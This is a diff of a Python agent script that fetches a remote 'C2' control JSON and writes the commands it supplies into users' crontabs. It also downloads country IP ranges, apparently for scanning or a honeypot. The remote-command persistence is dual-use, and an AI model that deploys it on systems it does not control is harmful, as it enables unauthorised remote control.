@@ -1,13 +1,54 @@
 #!/usr/bin/python3
 
+import os
+import pwd
 import json
 import time
 import socket
 import requests
+import crontab
 import subprocess
 
+def cleancron(myuser,mybasename):
+        cleancrony = crontab.CronTab(user=str(myuser))
+        cleancrony.remove_all(comment=mybasename)
+        cleancrony.write_to_user(myuser)
+
+def buildcron(myuser,mybasename,cmds,times):
+        crony = crontab.CronTab(user=str(myuser))
+        job = crony.new(command=cmds,comment=mybasename)
+        job.setall(times)
+        job.enable()
+        print(job)
+        crony.write_to_user(myuser)
+
+def docrons():
+        cronsdict = myvars()[3]
+        mybasename = myhostname()
+        #cleanup all old jobs
+        for cleanup in cronsdict:
+                cleanupjson = json.dumps(cleanup)
+                cleanupuser = json.loads(cleanupjson)
+                for myuser in cleanupuser:
+                        cleancron(myuser,mybasename)
+        #build all jobs from C2 json
+        for hostcrondict in cronsdict:
+                jayson = json.dumps(hostcrondict)
+                usernames = json.loads(jayson)
+                for user in usernames:
+                        for jobs in usernames[user]:
+                                jay = json.dumps(jobs)
+                                thisjob = json.loads(jay)
+                                for cmd in thisjob:
+                                        myuser = str(user)
+                                        mybasename = myhostname()
+                                        mycmd = str(cmd)
+                                        mytime = str(thisjob[cmd])
+                                        print(str(user) + str(cmd) + str(thisjob[cmd]))
+                                        buildcron(myuser,mybasename,mycmd,mytime)
+
 def getcontroljson():
-        get = requests.get("http://awebsite/control.json")
+        get = requests.get("http://coolwebsite/control.json")
         jason = json.loads(get.text)
         return jason
 
@@ -22,11 +63,12 @@ def myvars():
                                         myport = jout['port']
                                         myban = jout['banner']
                                         mycont = jout['continent']
-        return myport, myban, mycont
+                                        mycrons = jout['crons']
+        return myport, myban, mycont, mycrons
 
 def mycountries():
         countrycodes = []
-        ccjson = requests.get("http://awebsite/cc.json")
+        ccjson = requests.get("supercoolwebserver/cc.json")
         jason = json.loads(ccjson.text)
         for x in jason:
                 if x['Continent_Name'] == myvars()[2]:
@@ -34,11 +76,10 @@ def mycountries():
         return countrycodes
 
 def subnetlookup(cc):
-        #!!!!!!!!!!!!!!!!!!!!dockerize this and bring it internal later on!!!!!!!!!!!!!!!!!!!!!
         ranges = []
-        cctoasnapi = "http://www.cc2asn.com/data/"
-        cctoasnapiend = "_ipv4"
-        cleanurl = cctoasnapi + str(cc).lower() + cctoasnapiend
+        cctoasnapi = "veryniftydockerbabby/cc2asn-mini/db/"
+        cctoasnapiend = "_IPV4"
+        cleanurl = cctoasnapi + str(cc) + cctoasnapiend
         print(cleanurl)
         req = requests.get(cleanurl)
         for subnet in req.text.splitlines():
@@ -64,8 +105,11 @@ def myztaddress():
                 if x.startswith(ztsubnet):
                         return x
 
+def myuser():
+        return pwd.getpwuid(os.getuid())[0]
+
 def buildlvfile():
-        file = open("/home/serviceaccountname/localvars.txt","w+")
+        file = open("/home/redactedusermeowmeow/localvars.txt","w+")
         file.write(str(myvars())+"\n")
         file.write(str(myhostname())+"\n")
         file.write(str(myztaddress())+"\n")
@@ -74,9 +118,14 @@ def buildlvfile():
 
 def getranges():
         for x in mycountries():
-                thisfilename = "/home/paramiko/countries/" + str(x).lower() + "-ranges.txt"
+                thisfilename = "/home/redactedusermeowmeow/countries/" + str(x).lower() + "-ranges.txt"
                 file = open(thisfilename, "w+")
                 chonk = subnetlookup(x)
                 if len(str(chonk)) >= 7:
                         file.write('\n'.join(chonk))
                 file.close()
+
+#main starts here
+buildlvfile()
+docrons()
+#getranges()
